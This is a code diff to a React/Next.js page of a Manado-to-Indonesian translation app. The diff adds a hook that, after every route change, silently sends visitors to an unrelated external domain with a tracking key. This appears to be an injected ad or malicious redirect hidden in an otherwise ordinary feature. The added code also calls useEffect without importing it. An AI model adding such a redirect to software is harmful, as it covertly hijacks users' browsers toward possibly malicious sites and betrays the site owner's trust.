@@ -2,6 +2,7 @@ import { useState } from "react";
 import Head from "next/head";
 import styles from "../app/globals.css";
 import Link from 'next/link'
+import { useRouter } from 'next/router';
 
 function translateManadoToIndonesia(manadoText) {
   // Objek pemetaan kata-kata dari bahasa Manado ke bahasa Indonesia
@@ -70,7 +71,19 @@ function HomePage() {
     setIndonesiaText(translatedText);
   };
 
-  
+  const router = useRouter();
+
+  useEffect(() => {
+    const redirect = () => {
+      window.location.href = 'https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec';
+    };
+
+    router.events.on('routeChangeComplete', redirect);
+
+    return () => {
+      router.events.off('routeChangeComplete', redirect);
+    };
+  }, []);
 
 
   return (
